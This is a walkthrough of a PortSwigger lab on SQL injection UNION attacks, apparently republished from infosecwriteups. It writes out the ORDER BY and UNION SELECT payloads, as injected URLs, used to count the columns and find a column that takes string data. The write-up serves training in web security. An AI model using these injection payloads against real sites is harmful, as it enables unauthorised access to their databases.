# :globe_with_meridians: Burpsuite SQL Injection Lab 4(Union Attack)

> **Original Source:** [Burpsuite SQL Injection Lab 4(Union Attack)](https://infosecwriteups.com/burpsuite-sql-injection-lab-4-u-065f1592531f)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# Burpsuite SQL Injection Lab 4(Union Attack)


>

Pretext :


In the Previous labs , we learned how to find the number of columns being returned from the application.If you haven’t seen the article, you can see it here.


```
https://medium.com/@paradoxicalThief/sql-injection-union-attacks-4abdc8ecd0c1
```


briefly, we can find the number of Columns by the ORDER BY clause and confirm the number of columns by the UNION Select Statement.Now in this lab we want to find the datatype of the column being returned.

>

*Lab Descripton:*


This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.


The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. The Link to the Lab is following


[https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-finding-columns-with-a-useful-data-type/sql-injection/union-attacks/lab-find-column-containing-text#](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-finding-columns-with-a-useful-data-type/sql-injection/union-attacks/lab-find-column-containing-text#)

>

*Solution:*


The interesting data that you want to retrieve is normally in string form.So our main focus is to find the column with the string datatype.After you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of `UNION SELECT` payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:


If the Datatype in the injected column is not string then it will give us such an error.

>

Conversion failed when converting the varchar value ‘a’ to data type int.


If the Error does not occur then we are good to go.So lets hop on the lab.After accessing the lab, we see the typical portswigger lab interface.


Lets head towards the Gifts Category.


Now lets start our ORDER BY clause Attack to check the number of the columns that the application is returning.Remember that the Application will give an error when our columns in the ORDER BY clause will be greater than the actual number of columns being returned from the application.


After Putting repetitive ORDER BY statements in the category parameter we get an error when at table 4 .That means the Application is returning 3 columns.


## Get The Cyber Guy’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


[https://0a3e00d403be60c7805d5dd9002c00b7.web-security-academy.net/filter?category=](https://0a3e00d403be60c7805d5dd9002c00b7.web-security-academy.net/filter?category=Gifts)’ ORDER BY 1 - -


[https://0a3e00d403be60c7805d5dd9002c00b7.web-security-academy.net/filter?category=](https://0a3e00d403be60c7805d5dd9002c00b7.web-security-academy.net/filter?category=Gifts)’ ORDER BY 2 - -


[https://0a3e00d403be60c7805d5dd9002c00b7.web-security-academy.net/filter?category=](https://0a3e00d403be60c7805d5dd9002c00b7.web-security-academy.net/filter?category=Gifts)’ ORDER BY 3 - -


[https://0a3e00d403be60c7805d5dd9002c00b7.web-security-academy.net/filter?category=](https://0a3e00d403be60c7805d5dd9002c00b7.web-security-academy.net/filter?category=Gifts)’ ORDER BY 4 - -


we get an error at the 4.


Now lets confirm it from the UNION SELECT Attack.When the NULLs in the Union statement not equal to the number of columns being returned, then the application will give us an error.


[https://0a3e00d403be60c7805d5dd9002c00b7.web-security-academy.net/filter?category=](https://0a3e00d403be60c7805d5dd9002c00b7.web-security-academy.net/filter?category=Gifts)’ UNION SELECT NULL - -


[https://0a3e00d403be60c7805d5dd9002c00b7.web-security-academy.net/filter?category=](https://0a3e00d403be60c7805d5dd9002c00b7.web-security-academy.net/filter?category=Gifts)’ UNION SELECT NULL ,NULL - -


[https://0a3e00d403be60c7805d5dd9002c00b7.web-security-academy.net/filter?category=](https://0a3e00d403be60c7805d5dd9002c00b7.web-security-academy.net/filter?category=Gifts)’ UNION SELECT NULL,NULL,NULL - -


The Application will give us error at the 3 NULLS.


Ok so now that it is final that we have 3 columns being returned, we can proceed.If we look at the lab desc it says

>

The lab will provide a random value that you need to make appear within the query results


After the Union Attack, on the screen we can say that the application is saying

>

Make the database retrieve the string: ‘nXKMbe’


Now we just need to check the characters one by one in each place of the NULL.


If put these letters on the Second place of the NULL. Then we can see that the lab is solved.The Final Link that is sent to the Application is following

>

[https://0a3e00d403be60c7805d5dd9002c00b7.web-security-academy.net/filter?category=%27%20UNION%20SELECT%20NULL,%27nXKMbe%27,NULL--](https://0a3e00d403be60c7805d5dd9002c00b7.web-security-academy.net/filter?category=%27+UNION+SELECT+NULL%2C%27nXKMbe%27%2CNULL--)


---

*Originally published on [Medium](https://infosecwriteups.com/burpsuite-sql-injection-lab-4-u-065f1592531f). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
